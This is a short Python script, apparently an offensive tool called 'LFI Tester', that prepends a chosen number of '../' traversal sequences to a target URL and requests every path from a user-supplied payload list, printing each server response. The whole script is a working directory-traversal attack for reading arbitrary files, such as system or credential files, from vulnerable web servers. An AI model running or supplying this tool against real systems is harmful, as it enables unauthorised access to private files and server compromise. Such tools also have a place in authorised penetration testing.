#!/usr/bin/env python3

import argparse, subprocess, sys, requests, os 


banner = '='*65 + """\n 
     _    ______ _____   _____ _____ _____ _____ ___________ 
    | |   |  ___|_   _| |_   _|  ___/  ___|_   _|  ___| ___ \\
    | |   | |_    | |     | | | |__ \ `--.  | | | |__ | |_/ /
    | |   |  _|   | |     | | |  __| `--. \ | | |  __||    / 
    | |___| |    _| |_    | | | |___/\__/ / | | | |___| |\ \ 
    \_____\_|    \___/    \_/ \____/\____/  \_/ \____/\_| \_|
                                                         \n
                 Version 0.1 by Mickat1427               \n""" + '='*65






dir = '../'*int(input("how many dir's you want to test?: "))

try: 
      PayloadLst = input("please enter the full path of your payload list: ")
      Payloads = open(PayloadLst, "r").readlines()
      Payloads = [line.strip('\n') for line in open(PayloadLst, "r").readlines()]
except FileNotFoundError:
        print("\n Error, no file was specified\n")

parser = argparse.ArgumentParser(usage="lfi.py Vulnerable URL")

if not len(sys.argv) == 2:
    parser.error('Please enter a vulnerable URL\nProgram written by Mickat1427 ')

for LFI in Payloads:
    print('\n[+] Testing File:' + LFI)
    print(requests.get(sys.argv[1] + dir + LFI).text)
